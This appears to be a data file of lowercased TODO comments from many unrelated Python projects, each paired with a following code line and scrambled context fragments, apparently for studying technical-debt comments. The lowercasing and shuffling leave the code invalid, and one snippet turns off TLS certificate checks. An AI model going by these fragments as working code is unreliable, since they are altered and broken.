# todo: do we need to do this? </s> self._parser.push_symbol(unionend())	read_index label, data = self._current[self._key].popitem() self._current[self._key] = data index = alternative_symbol.labels.index(label) symbol = alternative_symbol.get_symbol(index)
# todo: when hytra is supported on windows, we shouldn't skip the test and throw an assert instead </s> try:	testTrackingHeadless logger.warn( "Conservation tracking could not be imported: " + str(e) ) raise nose.SkipTest import hytra except ImportError as e:
# todo xxx graalvm change </s> raise unittest.skiptest("not supported")	test_sni_callback_refcycle @needs_sni def test_sni_callback_refcycle(self): ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER) def dummycallback(sock, servername, ctx, cycle=ctx):
# todo(ytknzw): add more specific assertion with the test case. </s> study = create_study()	test_plot_intermediate_values trial.report(2.0, step=1) return 0.0 study.optimize(lambda t: objective(t, True), n_trials=1) figure = plot_intermediate_values(study)
# todo handle valueerror </s> if prop_name in config.prop_types:	__capture config.extra_props[prop_name] = prop_value; return True prop_value = config.prop_types[prop_name](prop_value) config.__dict__[prop_name] = prop_value
#todo - use a context manager here once we drop python 2.6 </s> self.assertraises(valueerror, kcluster, data,	test_kcluster [ 1, 1, 1, 1, 1], [ 1, 1, 1, 1, 1]], int) **{"nclusters": nclusters, "mask": mask, "weight": weight, "transpose": 0, "npass": 100,
# todo don't break, exhaust the iterator, otherwise </s> return self._input_chat	EventCommon self._chat = d.entity self._input_chat = d.input_entity @property def client(self):
# todo: configurable rsync options? </s> cmd = "rsync -avtz --no-p --no-g --delete %s/ %s" % \	YumRepoReleaser debug(output) print("Syncing yum repository back to: %s" % rsync_location) (yum_temp_dir, rsync_location) if self.dry_run:
# todo: needs further implementation </s> return datatablesheader(	headers @property def headers(self): DataTablesColumn(self.selected_location_type), DataTablesColumn(
# todo: make sort function that sorts events by mechanism so that </s> if true_mechanisms:	true_events true_mechanisms = set([c.mechanism for c in true_causes]).\ intersection(c.mechanism for c in true_effects) true_causes = tuple(filter(lambda t: t.mechanism in true_mechanisms, true_causes))
# todo: down to empty </s> assert x.left == 1	test_pop assert x.right == 1
# todo: avoid dummy and generate func here when inlining is possible </s> def _impl(df, n=5):	_impl return hpat.hiframes.pd_dataframe_ext.head_dummy(df, n)
# todo: assert </s> self.asserttrue(result)	test_remove_system Test: remove a system object result = self.remote.remove_system("testsystem0", self.token) assert 0
# todo(b/160786085): move this logic into overriding vars logic itself, </s> def _resolveckptpath(ckpt_rules):	Restore sess.run(tf.global_variables_initializer()) tf.logging.info('Initialized all vars.') return {GetSpecificCheckpoint(k): v for k, v in ckpt_rules.items()} for task in self._model.tasks:
#todo : make a real log mangment </s> print "stalking", self.get_name(), c.output	manage_stalking need_stalk = False if need_stalk:
#todo: check login_required? </s> if( ( trans.user == none )	display hda_dict = {} try: and ( history_id == trans.security.encode_id( trans.history.id ) ) ): history = trans.history
# todo: revisit this when we have a users app </s> return '/tiki-show_user_avatar.php?user=%s' % user.username	profile_avatar @register.function def profile_avatar(user):
# todo(shardy): may be able to remove when the bug above is fixed </s> nova = client.client(no_cache=true, **args)	authenticate args.update(credentials) try: except TypeError: nova = client.Client(**args)
# todo(rakhmerov): here we can define more informative messages </s> state_info = {	_on_action_complete if self.is_completed(): state = self._get_final_state() states.SUCCESS: None, states.ERROR: 'One or more actions had failed.',
# todo: manage errors </s> log.info("project {} closed".format(self._uuid))	_project_closed print(params) return self._closed = True self.project_closed_signal.emit()
# todo: handle multiple skip stacks </s> (skip, skip_stack), = skip_stack.items()	block_container_layout first_letter_style = getattr(box, 'first_letter_style', None) else: first_letter_style = None for index, child in enumerate(box.children[skip:], start=(skip or 0)):
# todo: next major version, remove cam id (unique_id is already in path) </s> filename = 'still-{cam_id}-{cam}-{ts}.jpg'.format(	camera_record else: save_path = assure_path_exists(os.path.join(camera_path, 'still')) cam_id=settings.id, cam=settings.name,
assert oldsize == self.size, '%s: %d, %d' % (self.type, oldsize, self.size) # todo: remove </s> return self.size	stsd_atom oldsize = self.size # TODO: remove self.size = 8 + 4 + 4 + sum([atom.calsize() for atom in self.body[1]])
# todo: replace with stream-changed </s> self._trigger_track_playback_started()	play if success: self.core.tracklist.mark_playing(tl_track) else: self.core.tracklist.mark_unplayable(tl_track)
# todo: merge scopes and claims </s> user_info = self.generate_user_info(request.user, scopes)	generate_id_token if not scopes or scopes[0] != 'openid': return None config = self.server.config alg = config['jwt_alg']
raise notimplementederror #todo, implement! </s> def testclass(cls):	testclass
common_path=prefix,  # todo: add key? </s> action="local",	make_inline_attachments_decision ld = local_diff[k] md = MergeDecision( conflict=False, local_diff=[ld],
# todo(developer): uncomment and set to a path to your audio file. </s> with io.open(speech_file, 'rb') as audio_file:	transcribe_file_with_enhanced_model from google.cloud import speech_v1p1beta1 as speech client = speech.SpeechClient() content = audio_file.read() audio = speech.types.RecognitionAudio(content=content)
# todo: identify the specific structure we're finding and document this a bit better </s> address = context.object("unsigned long long", offset = result - 6 - 8,	determine_valid_kernels min_address = kernels[0]['mz_offset']) for result in results: layer_name = physical_layer_name) try:
writetimeout=10000, # todo 1.3.8 rename to write_timeout for pyserial >= 3.x </s> parity=serial.parity_odd)	default 115200 if 115200 in baudrates else baudrates[0], timeout=read_timeout, else: serial_obj = serial.Serial(str(port),
# todo: determine proper template to use. </s> app_name + "." + recipe_format + ".recipe"] = "template tbd"	handle_install_recipe_input if app_name + "." + recipe_format + ".recipe" not in __existing_recipes__: __buildable_recipes__[
# todo: fix these repos finally! </s> repo = annexrepo(path, create=false, init=true)	test_AnnexRepo_add_to_annex @with_testrepos('.*annex.*', flavors=['clone']) def test_AnnexRepo_add_to_annex(path): if repo.is_direct_mode(): ok_clean_git_annex_proxy(path)
# todo: check that the performance measure is within some range </s> bottleneck0_baseline(num_runs=1, sumo_binary="sumo")	test_bottleneck0 Tests flow/benchmark/baselines/bottleneck0.py
# todo: ensure that if multiple flags are provided, the *last* one overrides </s> pwd = os.path.realpath(dest_dir) if arg.p else dest_dir	Cd util.error("cd %r: %s", dest_dir, os.strerror(e.errno)) return 1 state.SetGlobalString(mem, 'PWD', pwd) dir_stack.Reset()  # for pushd/popd/dirs
# todo there's probably a better way besides np.where, something from </s> for name, tag in zip(names, tags):	int_data_to_sets if len(names) != len(tags): names = [f"set{tag}" for tag in tags] self.cell_sets[name] = [np.where(d == tag)[0] for d in data] for key in keys:
# todo(mattjj): not passing forece_broadcast recursively... intentional? </s> return _broadcast(sz, get_aval(x), x, force_broadcast)	broadcast def broadcast(x, sz, force_broadcast=False):
# todo(justinsb): mock doesn't yet do this... </s> self.assertequal('active', found_server['status'])	test_deferred_delete created_server_id = created_server['id'] found_server = self._wait_for_state_change(created_server, 'BUILD') self.api.delete_server(created_server_id) found_server = self._wait_for_state_change(found_server, 'ACTIVE')
# todo: fix this! </s> pacman_options["downloadonly"] = true	install_packages downloaded_ok = [] pacman_options = {} for package_type in self.packages: logging.debug(_("Downloading packages from '%s' group...") % package_type)
# todo: should probably replace with input handler to remain consistent </s> if view:	to_ascii Delimiter to use in output file (defaults to ' ') header_space = 9*' ' data = self.view(data_name, apply_mask=apply_mask, nodata=nodata, interpolation=interpolation, as_crs=as_crs, kx=kx, ky=ky, s=s,
# todo: make sure pub is always correct </s> return 'pub/' + fname	get_new_filename else: fname = '%s/%s.%s.%s' % (self.obj.slug, name, nonce, name.split('.')[-1])
# todo(b/130724878): these conversions should not be needed. </s> return cls(	from_anon_tuple @classmethod def from_anon_tuple(cls, anon_tuple, round_num): model=anon_tuple.model._asdict(recursive=True), optimizer_state=list(anon_tuple.optimizer_state),
# todo: test me @jmcarp </s> def conference_view(**kwargs):	conference_view meetings = [] for meeting, data in MEETING_DATA.iteritems():
recording_software_name = none  # todo </s> recording_software_version = none  # todo	_recording_update_legacy_from_v1_15_to_pprf_2_0 start_time_synced_s = None  # TODO duration_s = None  # TODO recording_name = None  # TODO system_info = None #TODO
# todo: verify </s> manager.unregistered(self.consumer_id)	test_unregistered manager = factory.consumer_agent_manager()
# todo(guillermooo): we cannot access the ouput panel used by exec. </s> self.window.run_command('exec', {	on_done project = DartProject.from_path(view.file_name()) cmd = "pub run polymer:new_element {} -o \"{}\"" 'shell_cmd': cmd.format(name, self.get_target_path(view)), 'working_dir': project.pubspec.parent
# todo: remove when 36lts is discontinued </s> with open(recorded_mux, 'r') as mux_file:	retrieve_variants if recorded_mux is None: return None return pickle.load(mux_file)
# todo: use color instead of [ ] </s> if isinstance(src, source__interactive):	_PrintWithLocation if not isinstance(src, source__LValue):  # This is printed specially _PrintCodeExcerpt(line, line_span.col, line_span.length, f) source_str = '[ interactive ]'  # This might need some changes elif isinstance(src, source__CFlag):
# todo: rip that out </s> self.text = self._wz.get_data(	Request self.mimetype = self._wz.mimetype  #: The mimetype of the incoming Request. self.accepts_mimetypes = None cache=False, as_text=True )  #: The Request body, as unicode.
#todo force redraw rather than queue? (like before) </s> self.c_da.queue_draw()	on_page_change self.c_frame.set_property("ratio", pr) self.p_frame_cur.set_property("ratio", pr) self.p_da_cur.queue_draw() if page_next is not None:
# todo: clean up </s> outfilepath = os.path.join("//", render_directory, "render_chunk_#######")	render_proc def render_proc(args, start_frame, end_frame, render_directory): Render a chunk of the blender file. params = [ 'blender', '-b', args.blendfile, '-s',
# todo: make sure the image is present or pull it </s> base_image = "registry.fedoraproject.org/fedora:28"	test_build_basic_image_with_build_volumes vol_spec = "%s:%s" % (real_tmp, container_mount) basic_playbook_path = os.path.join(data_dir, "basic_playbook_with_volume.yaml") target_image = "registry.example.com/ab-test-" + random_word(12) + ":oldest" cmd = ["build", "-v", vol_spec, "--",
# todo: more advanced widget for this </s> self._set_page_completion(entry)	_set_namespace_completion def _set_namespace_completion(self, entry):
# todo remove sorted? completions should be sorted? </s> comp_str = str(sorted([str(c) for c in completions]))	completion_test fails += 1 else: if comp_str != correct: print 'Solution not correct, received %s, wanted %s' % \
# todo: replace with stream-changed </s> self._trigger_track_playback_started()	play if success: self.core.tracklist.mark_playing(tl_track) else: self.core.tracklist.mark_unplayable(tl_track)
# todo: this completion may not be good, since it resets to 0 later. </s> history.append([note_hot, beat_input, completion_input, style])	generate beat_input = compute_beat(i, NOTES_PER_BAR) completion_input = np.array([i / (len(inspiration) - 1)]) composition = [] N = NOTES_PER_BAR * bars
time_behind = time.time() - cblock.ntime   # todo: block times are not very reliable. </s> if time_behind > 60 * 60 * 2:   # two hours.	backend_state block_hash_bin = proxy.getblockhash(block_count) cblock = proxy.getblock(block_hash_bin) raise BackendError('Bitcoind is running about {} seconds behind.'.format(round(time_behind))) logger.debug('Backend state check passed.')
# todo: verify/modify these lists </s> version_changing_attrs = ["xpath", "name", "type", "is_repeatable" ]	_do_child_attribute_check Assumes the element passed in is referenced inside one of the forms, but it could be arbitrarily nested""" nonversion_changing_attrs = ["tag"] for attr in version_changing_attrs:
# todo: this actually looks like a bug, but this code </s> d.addcallback(lambda step: step.unsubscribe(receiver))	stepStarted step.subscribe(receiver) d = step.waitUntilFinished() step.waitUntilFinished().addCallback(self._stepFinished)
# todo: handle ta seeds </s> status, cost, runtime, additional_info = self.executor.run(	run_initial_design rand_inst = self.scenario.train_insts[rand_inst_id][0] initial_seed = random.randint(0, MAXINT) default_conf, instance=rand_inst, cutoff=self.scenario.cutoff, seed=initial_seed)
device.tags[q] = self.data.tags[ids] #todo </s> device.index[:l, q] = numpy.ones((l,), dtype = 'int8')	assign_dev_data if self.data.ctc_targets is not None and not chunking_active: device.ctc_targets[q] = self.data.ctc_targets[ids] offset += batch.shape[1] else:
# todo deprecated, remove in 1.4.0 </s> file=full_path,	_payload_for_print_job_event path=path, origin=origin, filename=name) if position is not None:
# todo add options to maodify the sorted by key and the header options </s> matrix = sorted(matrix, key=lambda endpoint: endpoint[1])	do_clear endpoint.endpoint_data['ipv6']]) if len(matrix) > 0: matrix.insert(0, ['Name', 'MAC Address', 'Segment', 'Port', 'VLAN', 'IPv4', 'IPv6'])
# todo: get this from ourselves. </s> version      = key[1],	ConstraintCollectionBase self.variable_traces[ key ] = VariableMergeTrace( variable     = yes_variable, trace_yes    = self.variable_traces[ yes_variable, yes_version ], trace_no     = trace_no
# todo: arrange </s> system = self.remote.get_item_handle("system", "testsystemcopy", self.token)	test_rename_system def test_rename_system(self): Test: rename a system object result = self.remote.rename_system(system, "testsystem1", self.token) self.assertTrue(result)
logg.error("too long") # todo </s> self.end(200)	test_5035_notify_service_functions_user self.rm_testdir() self.coverage()
# todo(ib-steffen): allow custom ca bundles </s> r = requests.post(url, headers=headers, json=deploy_key_config, verify=false)	post url = '%s/repos/%s/%s/keys' % (os.environ['INFRABOX_GITHUB_API_URL'], owner, repo_name) if r.status_code != 201: abort(400, 'Failed to create deploy key')
# todo implement </s> ret = 1	hook_GetStringTypeW }) def hook_GetStringTypeW(ql, address, params): return ret
#todo: geli detach -l </s> self.__system("zpool set cachefile=/data/zfs/zpool.cache %s" % (z_name))	__create_zfs_volume self.__system("zpool import -R /mnt %s" % (z_name))
# todo: remove update flicker. for win32console we could set the cursor </s> if self._stdout_output_writer:	_PrintStatusUpdate u'All extraction workers completed - waiting for storage.\n') self._output_writer.Write(u'\n') sys.stdout.flush()
# todo: move this function somewhere else </s> def get_raw_directory_stats(path_obj):	get_raw_directory_stats Example:: {'translated': {'units': 0, 'percentage': 0, 'words': 0},
# todo: handle escape (0x1b) </s> for d in data:	decode_in def decode_in(self, data): d = ord(d) if not self.in_parsing and d != Decoder.REQUEST_MAGIC:
# todo: the logic here for ion concentration setting is in two </s> if len(ion_elts) == 1:	preprocess_pourbaix_entries for entry in ion_entries: ion_elts = list(set(entry.composition.elements) - elements_HO) entry.concentration = 1e-06 * entry.normalization_factor elif len(ion_elts) > 1 and not entry.concentration:
# todo(tr3buchet) - remove comment in multi-nic </s> bridge = network['bridge']	spawn 'ips': [ip_dict(ip) for ip in network_IPs]} self.write_to_param_xenstore(vm_ref, {location: mapping}) network_ref = \ NetworkHelper.find_network_with_bridge(self._session, bridge)
# todo(nakago): check why tolerance is high </s> def test_backward_cpu(model, data):	test_backward_cpu atom_data, adj_data, y_grad = data params = tuple(model.params())
# todo: cleanup </s> self.asserttrue(self.remote.rename_repo(repo, "testrepo1", self.token))	test_rename_repo repo = self.remote.get_item_handle("repo", "testrepo0", self.token)
except httperror as e:  # @todo ask for server instead </s> print("invalid url provided")	findBestServers try: response = requests.get(url, headers=headers).json() for i in response: if i["exists"] is True:
# todo: raise proper error </s> raise assertionerror("ifs shouldn't be an array")	_GetJoinChar return val.s[0] else:
# todo: replace with is_finite() instead of checking cardinality? </s> if all(g.group_generators().cardinality() != float('inf') for g in f):	group_generators return self._cartesian_product_of_elements(cur) from sage.sets.family import Family ret = [lift(i, gen) for i,G in enumerate(F) for gen in G.group_generators()] return Family(ret)
# @todo: return only packages for the current architecture </s> pkg_name = aur_pkg.name	print_aur_search_results reverse=True ): if args.quiet: print(pkg_name)
# todo: write validate method </s> return true	BasePanelsJson self.version = str() def validate(self): def __call__(self): if self.validate():
# todo: determine correct computation for panning. http://en.wikipedia.org/wiki/pan_law seems relevant but was short on actual formulas. may depend on headphones vs speakers? this may be correct already for headphones -- it sounds nearly-flat to me. </s> self.audio_gain_l_block.set_k(gain * (1 - pan))	_update_audio_gain gain = self.audio_gain pan = self.audio_pan self.audio_gain_r_block.set_k(gain * (1 + pan))
# todo: ensure template has resources </s> from zim.fs import file	testSingleFile def testSingleFile(self): folder = self.setUpFolder('single', mock=tests.MOCK_ALWAYS_REAL) file = folder.file('test.html')
# todo: make options for "text included" vs. "text matches" </s> if (trigger_text != none and trigger_text != "" and	search_anns_for_event except: Messager.error('Failed to retrieve trigger annotation %s, skipping event %s in search' % (e.trigger, e.id)) trigger_text != "*" and trigger_text not in t_ann.text): continue
# todo: fetch spoolup option </s> defaultspoolvalue = 1	getWeaponSystemData else: maxRange = stats.maxRange spoolOptions = SpoolOptions(SpoolType.SCALE, defaultSpoolValue, False) statDict = {
# todo(mriedem): call select_destinations() with a </s> try:	_allocate_for_evacuate_dest_host 'not found.', instance.host, instance.node, instance=instance) scheduler_utils.claim_resources_on_destination( context, self.report_client, instance, source_node, dest_node)
# todo: check return value of attachthreadinput properly </s> win32functions.waitguithreadidle(self)	TypeKeys turn_off_numlock) win32functions.AttachThreadInput(win32functions.GetCurrentThreadId(), window_thread_id, win32defines.FALSE) if isinstance(aligned_keys, six.text_type): self.actions.log('Typed text to the ' + self.FriendlyClassName() + ': ' + aligned_keys)
pass # todo </s> def on_antialiasing_action_changed(self, *args):	on_antialiasing_action_changed
# todo: process </s> result = content.install(units, options)	install_units content = Agent.Content()
# todo(ihrachys): replace with port.create() once we get an object </s> port = db_api.create_object(self.context, models_v2.port,	test_attach_port_get_port_policy network = db_api.create_object(self.context, models_v2.Network, {'name': 'test-network1'}) {'name': 'test-port1', 'network_id': network['id'],
# despite copystat mtime is not copied. todo </s> return (st.st_mode, st.st_uid, st.st_gid, st.st_size, st.st_atime)	stats st = os.fstat(fd.fileno())
log_importance_weight = none  # todo: check the reason/behavior for this </s> variable = variable(distribution=distribution, value=value, address_base=address_base, address=address, instance=instance, log_prob=log_prob, log_importance_weight=log_importance_weight, observed=true, name=name)	observe log_importance_weight = float(log_prob) else: _current_trace.add(variable)
# todo(jeremydw): read manifest and takedown old content here. </s> connection = boto.connect_gs(self.access_key, self.secret, is_secure=false)	dump start = time.time() logging.info('Connecting to GCS...') bucket = connection.get_bucket(self.bucket) logging.info('Connected! Configuring bucket: {}'.format(self.bucket))
# todo: write this method if possible </s> pass	address_transactions def address_transactions(self, addresslist):
raise notimplementederror #todo </s> elif self.action == "select":	Action raise NotImplementedError #TODO elif self.action == "SPLIT": pass return actorselection
# todo: make an ascii-art bar </s> return "%.1f%%" % (100.0 * progress)	render_progress_encode_push def render_progress_encode_push(self, ctx, data): progress = data.get_progress()[2]
pass  # todo </s> def _value_type_rgbcolor(self, *args):	_value_type_rgbcolor
# todo: add strict mode and expose warnings. </s> pass	_EvalBracedVarSub regex, warnings = glob_.GlobToERE(pat_val.s) if warnings: replacer = string_ops.GlobReplacer(regex, replace_str, op.spids[0]) if val.tag == value_e.Str:
# todo add locales </s> raise yunohosterror("must_be_positive", value_type=type(ttl))	domain_setting raise YunohostError("bad_value_type", value_type=type(ttl)) if ttl < 0: domain_settings[key] = value
raise exceptions.mpdnotimplemented  # todo </s> lines.	channels Obtain a list of all channels. The response is a list of "channel:"
# todo: test me @jmcarp </s> admins = [	manage_contributors if user not in users ] user for user in users if self.has_permission(user, 'admin')
# @todo: extend entity_types within the template </s> deploy_alert = t("deployment alert"),	PersonEntityModel org_group_label = T("Organization group") pe_types = Storage(cr_shelter = SHELTER, dvi_body = T("Body"), dvi_morgue = T("Morgue"),
# bezel correction todo don't show if span mode is multi image or simple span. </s> if true:	create_sizer_settings_right def create_sizer_settings_right(self): self.create_sizer_settings_advanced() self.sizer_setting_paths = wx.StaticBoxSizer(wx.VERTICAL, self, "Wallpaper Paths")
# todo: sinpi </s> s = pi/cmath.tan(pi*x)	_digamma_complex if x.real < 0.5: x = 1.0-x else: s = 0.0
# todo: dynamically define all endpoints </s> request_handlers.extend([	_get_request_handlers 'HTTP routes from extensions: %s', list((l[0], l[1]) for l in request_handlers)) (r'/mopidy/ws/?', handlers.WebSocketHandler, {'actor': self}), (r'/mopidy/rpc', handlers.JsonRpcHandler, {'actor': self}),
#todo discont: actually use offsets instead of (start, end)! </s> messager.warning('__create_span(): using (start, end)')	__create_span def __create_span(ann_obj, mods, type, offsets, txt_file_path, projectconf, attributes): start, end = offsets[0] start = int(start)
# todo: do we change this to something like "threshold" </s> m, n = int(request.args['m']), int(request.args['n'])	create_policy bob_pubkey = bytes.fromhex(request.args['bob_encrypting_key']) label = bytes.fromhex(request.args['label']) payment_details = request.args['payment'] federated_only = True # const for now
# todo(piyush): current api-site doesn't contain this api description. </s> put_body = json.dumps(kwargs)	update_snapshot_metadata_item def update_snapshot_metadata_item(self, snapshot_id, id, **kwargs): url = "snapshots/%s/metadata/%s" % (str(snapshot_id), str(id)) resp, body = self.put(url, put_body)
return  # todo: return a 200, with whatever policy metadata. </s> kfrag)	set_policy hrac_as_hex,
# todo: action value doesn't exist for beta </s> baseline_policy = dict(	test_late_horizon_estimate horizon=2, estimate_horizon='late', estimate_actions=True, estimate_terminal=True ) network=dict(type='auto', size=7, depth=1, internal_rnn=1), distributions=dict(float='gaussian')
#todo: python2 specific, remove </s> except unicodeencodeerror:	_process_tag try: tag_value = repr(self.tags[ifd_name + ' ' + tag_name]) tag_value = unicode(  # pylint: disable=undefined-variable self.tags[ifd_name + ' ' + tag_name]
#todo: overly broad exception needs fixing </s> except exception:	get_counts count_query['query']['filtered']['query']['query_string']['query'] = \ re.sub(r' AND category:\S*', '', count_query['query']['filtered']['query']['query_string']['query']) pass if count_query.get('from') is not None:
# todo(b/161332815): make jax actor work with batched or unbatched inputs. </s> observation = utils.add_batch_dim(observation)	batched_policy def batched_policy(params, key, observation): return policy(params, key, observation)
# todo fix. </s> self.assertequals(reil_ctx_out["xmm0"], res)	test_movq_3 res = 0x00000000000000008765432187654321 x86_ctx_out, reil_ctx_out = self.__run_code(asm, 0xdeadbeef, ctx_init) self.assertEquals(reil_ctx_out["rax"], ctx_init["rax"])
# todo: arrange </s> result = self.remote.get_repo_config_for_system("testprofile0")	test_get_repo_config_for_system def test_get_repo_config_for_system(self): Test: get repository configuration of a system assert 0
#todo this is not valid in multiprocessing! </s> yield pulsar.not_done	testFakeSignal self.assertTrue(arbiter.signal_queue.qsize() >= 1)
pass # todo </s> return {'id': 0}	_add @register(r'^addid "(?P<uri>[^"]*)"( (?P<position>\d+))*$') def _add(self, uri, position=None):
# todo find out if this is good because of sparcity... </s> 'handles_regression': true,	get_properties 'handles_numerical_features': True, 'prefers_data_scaled': True, 'handles_classification': False, 'handles_multiclass': False,
# todo: change the frontend to pass seconds instead. </s> expires_at = (now_in_seconds + one_hour_in_seconds) * 1000	test_existing_email_create_user return {'sub': 'email', 'email': email, 'exp': id_token_expiration_timestamp} monkeypatch.setattr(AuthBackend, '_get_user_info', userinfo_mock) existing_user = User.objects.create(username="email/foo@bar.net", email=email) resp = client.get(
# todo: remove after pylint 1.4+ </s> self.assertequals(result._asdict(), expected_dict)	test_result_as_dict 'domain' : 'google', 'suffix' : 'com'}
# todo(ytknzw): add more specific assertion with the test case. </s> plot_param_importances(study, evaluator=meandecreaseimpurityimportanceevaluator())	test_plot_param_importances figure = plot_param_importances(study) assert figure.has_data() is True assert figure.has_data() is True figure = plot_param_importances(study, params=["param_b"])
# fixme: todo </s> entry = entry._replace(postings=new_postings)	rebook_as_fifo new_postings.append(posting._replace( position=position.Position(new_lot, pos.number))) new_entries.append(entry) return new_entries, errors
#todo: assuming constant mu </s> if getattr(self, '_mfmui', none) is none:	MfMui @property def MfMui(self): self._MfMui = self.mesh.getFaceInnerProduct(1/mu_0) return self._MfMui
# todo test cases </s> return new_sensor_alert_states	_process_sensor_alert new_sensor_alert_states.append(sensor_alert_state)
# todo(pkilambi): process the output as needed </s> return out	service_show try: out = utils.execute('kubectl', 'describe', 'service', uuid) except Exception as e: LOG.error("Couldn't describe service  %s due to error %s"
# todo(developer): uncomment these lines and replace with your values. </s> parent = client.queue_path(project, location, queue)	create_http_task from google.protobuf import timestamp_pb2 client = tasks_v2beta3.CloudTasksClient()
#todo: actually check for change </s> self._smudge('__setslice__', k, v)	__setslice__ def __setslice__ (self, k, v): list.__setslice__(self, k, v)
# todo: password is a required field for a galaxy user record. however, it should not be required </s> kwargs['password'] = ''.join(	create_user @classmethod def create_user(cls, *args, **kwargs): random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(16)) model = cls.user_model()
# todo: remove snap when updating this image </s> ax.pcolormesh(x, y, z, transform=ccrs.platecarree(), snap=false)	test_pcolormesh_goode_wrap ax = plt.axes(projection=ccrs.InterruptedGoodeHomolosine(emphasis='land')) ax.coastlines()
# todo: decorate with abstractmethod after torchhook is extended </s> raise notimplementederror	__enter__ def __enter__(self):
# todo: extend it for estimator from other frameworks - mllib, h20, vw </s> if ('coef_' in estimator.__dict__) is false:	understand_estimator def understand_estimator(estimator, class_label_index, features_by_class, feature_names, no_of_features, top_k, relevance_type='default'): raise KeyError('the estimator does not support coef, try using LIME for local interpretation') coef_list = list(np.squeeze(estimator.coef_[class_label_index]))
# todo : </s> def compute_peaks(self, y):	GLPlotWidget print color.red(), color.green(), color.blue() self.setQuadData(x1_with_peaks, y_with_peaks - 2., x2_with_peaks - x1_with_peaks, 2., r_with_peaks, g_with_peaks, b_with_peaks) if len(self.peak) <> len(y): y_ones = ones(y.shape)
# todo: must be implemented </s> pass	get_crawlers_to_search def get_crawlers_to_search(self, links):
# todo setup mahout, must be checked out from repo atm: </s> pass	install_mahout def install_mahout(env):
# todo: add proper checks (e.g. check if input stuff is pandas full of objects) </s> return check_x_y(x, y, dtype=none, ensure_2d=false)	check_ts_X_y def check_ts_X_y(X, y): use preexisting ones with bypass (temporarily)
# todo: instead of raising, we should do something </s> for task, (cfrag, reencryption_signature) in zip(self.tasks, cfrags_and_signatures):	complete else: raise InvalidSignature(f"{cfrag} is not properly signed by Ursula.") task.attach_work_result(cfrag, reencryption_signature) self.completed = maya.now()
# todo: change the frontend to pass seconds instead. </s> expires_at = (now_in_seconds + one_hour_in_seconds) * 1000	test_existing_email_create_user return {'sub': 'email', 'email': email, 'exp': id_token_expiration_timestamp} monkeypatch.setattr(AuthBackend, '_get_user_info', userinfo_mock) existing_user = User.objects.create(username="email/foo@bar.net", email=email) resp = client.get(
# todo placeholder; implement </s> futs = rpc_async_on_role(role, func, args, kwargs, timeout)	rpc_sync_on_role role: str, func, args=None, kwargs=None, timeout=UNSET_RPC_TIMEOUT ) -> Dict[str, Any]: return wait_all(futs)
# todo remove input dropout, just here for testing </s> stacked_inputs = self.bn0(stacked_inputs)	score_emb p_emb_2d = p_emb.view(-1, 1, int(self.emb_height), int(self.emb_width)) stacked_inputs = torch.cat([s_emb_2d, p_emb_2d], 2) stacked_inputs = self.input_dropout(stacked_inputs) out = self.convolution(stacked_inputs)
# todo: ... </s> pass	CaseSearchConfigView return super(CaseSearchConfigView, self).dispatch(request, *args, **kwargs) def post(self, request, *args, **kwargs): @property def page_context(self):
raise  # todo </s> else:	make_arrangements sampled_miners = self.alice.recruit(quantity=quantity or self.n) except MinerAgent.NotEnoughMiners: ursulas = (Ursula.from_miner(miner, is_me=False) for miner in sampled_miners) for ursula in ursulas:
#todo: add metadata support when it is merged from develop </s> 'user': job.get('user', 'root')}	_format_job_instance 'Target-type': job.get('tgt_type', []),
timeout = 0.1  # todo: receive as a parameter </s> start_time = time.time()	import_data database_uri = os.environ["DATABASE_URL"] encoding = "utf-8"  # TODO: receive as a parameter progress = ProgressBar(prefix="Importing data", unit="bytes") file_header = open_compressed(filename).readline().strip().split(",")
# todo: move this file counting into the `productgraph`. </s> target_file_count = self.build_graph.target_file_count()	_set_affected_target_files_count_in_runtracker def _set_affected_target_files_count_in_runtracker(self): self.run_tracker.pantsd_stats.set_affected_targets_file_count(target_file_count) return target_file_count
# todo: make sure reply_email is unique </s> reply_email = f"reply+{random_words()}@{email_domain}"	handle_forward website_email, ) forward_email = ForwardEmail.create( gen_email_id=gen_email.id,
# todo: logging, or warning </s> print "cpickle has failed to write an object to " + filepath	_save cPickle.dump(obj, filehandle) except Exception, e: if str(e).find('maximum recursion depth exceeded') != -1: raise
# todo: convert [n, c, v] to  new convention [v, n, c] </s> return crossentropyloss	get_module def get_module(self):
# todo xxx graalvm change </s> raise unittest.skiptest("not supported private debugging interface")	test_msg_callback def test_msg_callback(self): client_context, server_context, hostname = testing_context() def msg_cb(conn, direction, version, content_type, msg_type, data):
# todo still need to remove the file </s> try:	move_win def move_win(from_path, to_path): shutil.copy(from_path, to_path) from exceptions import WindowsError as win_except except ImportError as e:
# todo(rbg): remove duplicated code </s> if self._cur + cfg.train.ims_per_batch >= len(self._roidb):	_get_next_minibatch_inds def _get_next_minibatch_inds(self): self._shuffle_roidb_inds() db_inds = self._perm[self._cur:self._cur + cfg.TRAIN.IMS_PER_BATCH]
# todo: remove when pre-csrf token templatetags are no longer supported </s> is_old_django = getattr(settings, 'old_django', false)	test_csrf_token_POST_form def test_csrf_token_POST_form(self): if not is_old_django: form_helper = FormHelper()
# todo: remove in 21.08 </s> if os.path.isfile(cache_text_file) and \	download_audio cache_audio_dir (path): path to store .wav files cache_text_file (file): file containing the sentences os.path.exists(cache_audio_dir): if not os.listdir(cache_audio_dir):
assert study_id == 0  # todo(akiba) </s> trial_id = len(self.trials)	create_new_trial_id def create_new_trial_id(self, study_id): self.trials.append(trial.Trial(trial_id)) return trial_id
# todo: this check was too simple, and broke a few things: </s> with self.assertraisesregex(coverageexception, 'mutually exclusive'):	test_bad_run_args_with_both_source_and_include def test_bad_run_args_with_both_source_and_include(self): return self.command_line("run --include=pre1,pre2 --source=lol,wut foo.py", ret=ERR)
# todo it would be good to support different kind of shells </s> if not _get_user_for_ssh(auth, username):	user_allow_ssh Keyword argument: username -- User username raise MoulinetteError(errno.EINVAL, m18n.n('user_unknown', user=username)) auth.update('uid=%s,ou=users' % username, {'loginShell': '/bin/bash'})
raise notimplementederror # todo </s> def em_step(self):	EM_step
# todo generator </s> handle_dirty_dataset(ds, mode=if_dirty)	__call__ for ds_path in content_by_ds: ds = Dataset(ds_path) content = [ap['path'] for ap in content_by_ds[ds_path] if ap.get('type', None) != 'dataset' or ap['path'] == ds.path]
# todo find out if this is good because of sparcity... </s> 'prefers_data_normalized': true,	get_properties 'handles_numerical_features': True, 'prefers_data_scaled': True, 'is_deterministic': True, 'handles_sparse': True,
